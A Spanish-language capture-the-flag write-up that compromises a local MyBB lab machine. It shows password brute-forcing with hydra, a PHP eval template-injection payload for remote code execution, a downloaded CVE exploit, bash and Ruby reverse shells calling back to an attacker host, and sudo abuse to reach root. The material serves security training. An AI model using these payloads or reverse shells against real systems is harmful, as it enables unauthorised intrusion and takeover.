
# Writeup Template: Maquina `[ MyBB ]`

- Tags: #MyBB
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina MyBB](https://mega.nz/file/BfsEXQCa#QK5FLpPoY4nIdeupfy-dBbjUV2hBxl_X6yCTytD_pl8)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x mybb.zip
sudo bash auto_deploy.sh mybb.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```

Revisando el codigo fuente tenemos **hostsDiscovery** asi que agregaremos el siguiente cominio a mi archivo: **( /etc/hosts )**
```bash
172.17.0.2 panel.mybb.dl
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/css/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/images/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/js/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://panel.mybb.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/images/              (Status: 200) [Size: 67]
/uploads/             (Status: 200) [Size: 67]
/archive/             (Status: 200) [Size: 1529]
/admin/               (Status: 200) [Size: 1808]
/install/             (Status: 200) [Size: 1030]
/cache/               (Status: 200) [Size: 67]
/inc/                 (Status: 200) [Size: 67]
/backups/             (Status: 200) [Size: 933]
/jscripts/            (Status: 200) [Size: 67]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://panel.mybb.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,html,sh,txt
```

- **Hallazgos**:
```bash
/images               (Status: 301) [Size: 315] [--> http://panel.mybb.dl/images/]
/index.php            (Status: 200) [Size: 13761]
/rss.php              (Status: 302) [Size: 0] [--> syndication.php]
/archive              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/archive/]
/contact.php          (Status: 200) [Size: 12695]
/search.php           (Status: 200) [Size: 14972]
/misc.php             (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/uploads/]
/stats.php            (Status: 200) [Size: 10463]
/global.php           (Status: 200) [Size: 98]
/admin                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/admin/]
/calendar.php         (Status: 200) [Size: 27244]
/online.php           (Status: 200) [Size: 11300]
/member.php           (Status: 302) [Size: 0] [--> index.php]
/showthread.php       (Status: 200) [Size: 10562]
/report.php           (Status: 200) [Size: 11097]
/portal.php           (Status: 200) [Size: 13640]
/memberlist.php       (Status: 200) [Size: 18803]
/forumdisplay.php     (Status: 200) [Size: 10542]
/css.php              (Status: 200) [Size: 0]
/install              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/install/]
/announcements.php    (Status: 200) [Size: 10326]
/polls.php            (Status: 200) [Size: 0]
/private.php          (Status: 200) [Size: 11211]
/javascript           (Status: 301) [Size: 319] [--> http://panel.mybb.dl/javascript/]
/cache                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/cache/]
/syndication.php      (Status: 200) [Size: 429]
/inc                  (Status: 301) [Size: 312] [--> http://panel.mybb.dl/inc/]
/newreply.php         (Status: 200) [Size: 10324]
/printthread.php      (Status: 200) [Size: 10324]
/captcha.php          (Status: 200) [Size: 0]
/usercp.php           (Status: 200) [Size: 11332]
/attachment.php       (Status: 200) [Size: 10328]
/newthread.php        (Status: 200) [Size: 10301]
/task.php             (Status: 200) [Size: 43]
/warnings.php         (Status: 200) [Size: 11097]
/reputation.php       (Status: 200) [Size: 10343]
/backups              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/backups/]
/htaccess.txt         (Status: 200) [Size: 3088]
/jscripts             (Status: 301) [Size: 317] [--> http://panel.mybb.dl/jscripts/]
/moderation.php       (Status: 200) [Size: 11090]
/editpost.php         (Status: 200) [Size: 11097]
```

### Credenciales Encontradas
despues de ver en su buscador por usuario detectamos dos usuarios:
```bash
test
admin
```

realizaremos un ataque de fuerza bruta para el administrador:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:The username and password combination you entered is invalid."
```

Tenemos varias respuestas, para probar:
```bash
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345
[80][http-post-form] host: panel.mybb.dl   login: admin   password: abc123
[80][http-post-form] host: panel.mybb.dl   login: admin   password: rockyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345678
[80][http-post-form] host: panel.mybb.dl   login: admin   password: princess
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456789
[80][http-post-form] host: panel.mybb.dl   login: admin   password: password
[80][http-post-form] host: panel.mybb.dl   login: admin   password: iloveyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 1234567
[80][http-post-form] host: panel.mybb.dl   login: admin   password: nicole
[80][http-post-form] host: panel.mybb.dl   login: admin   password: daniel
[80][http-post-form] host: panel.mybb.dl   login: admin   password: lovely
[80][http-post-form] host: panel.mybb.dl   login: admin   password: jessica
[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
[80][http-post-form] host: panel.mybb.dl   login: admin   password: monkey
```

Nos loguemas en el pandel de administracion:
```bash
username: admin
password: babygirl
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Desde el panel de administracion nos indica que esta usando la version: **( 1.8.35 )** e Investigando en la web tenemos esta info:

- Versiones anteriores como 1.8.32 y 1.8.33 tenían vulnerabilidades críticas:
    - **RCE (Ejecución Remota de Código)** en 1.8.32 mediante cadena de ataques LFI (Local File Inclusion) que requería credenciales de administrador9.
    - **XSS (Cross-Site Scripting)** en 1.8.33 a través de la gestión de temas8.

### Ejecucion del Ataque
Para explotar su vulnerabilidad **RCE** en **( Templates > defual templates > Who's Online Templates )**
En este template inyectamos el siguiente fragmente:
```bash
<!--{$db->insert_id(isset($_GET[1])?die(eval($_GET[1])):'')}{$a[0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0]}-->
```

En donde estamos logueados cargamos el recurso:
```bash
http://panel.mybb.dl/online.php
```

Explotamos el **RCE**
```bash
# Comandos para explotación
http://panel.mybb.dl/online.php?1=system("whoami");
```

### Intrusion
Para la intrusion nos descargaremos este exploit del siguiente repositorio:
```bash
wget https://raw.githubusercontent.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE/refs/heads/main/exploit.py
```

```bash
chmod +x exploit.py
```

Revisamos el modo de uso:
```bash
python3 exploit.py
usage: exploit.py [-h] [--admincp ADMINCP] [--user-agent USER_AGENT] target username password
exploit.py: error: the following arguments are required: target, username, password
```

```bash
python3 exploit.py http://panel.mybb.dl/ admin babygirl
```

```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
En esta ruta:
```bash
/var/www/mybb/backups
```


Tenemos el archivo: **( data )**
```bash
2024-06-16 12:35:33,INFO,User 'alice' attempted login with password '$2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi'
```

Tenemos una posible contrasena, Asi que usaremos **john** para **crackearla**
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Tenemos la password
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
tinkerbell       (?)
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:

```bash
# Comando para escalar al usuario: ( alice )
su alice # ( tinkerbell )
```

###### Usuario `[ alice ]`:
Listando los privilegios para este usuario:
```bash
User alice may run the following commands on 685da950ef26:
    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
```

Revisando la carpta **scripts** no exoste ningun archivo con esa extension asi que crearemos uno
```bash
nano /home/alice/scripts/exploit.rb
```

No tenemos el editor **nano** asi que lo aremos de la siguiente manera:
Nos descargamos este desde internet.
```bash
git clone https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325
```

El script contiene esta instruccion:
```rb
#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 1337 

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 444, '172.17.0.1'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
```

Ahora este lo transferimos a la maquina victima:
```bash
wget http://172.17.0.1/rshell.rb
```

```bash
chmod +x rshell.rb
```

Ahora nos podemos en escucha desde nuestra maquina atacante:
```bash
nc -nlvp 444
```

Ejecutamos el script:
```bash
sudo -u root /home/alice/scripts/rshell.rb
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
listening on [any] 444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 53990
# whoami
root
```

---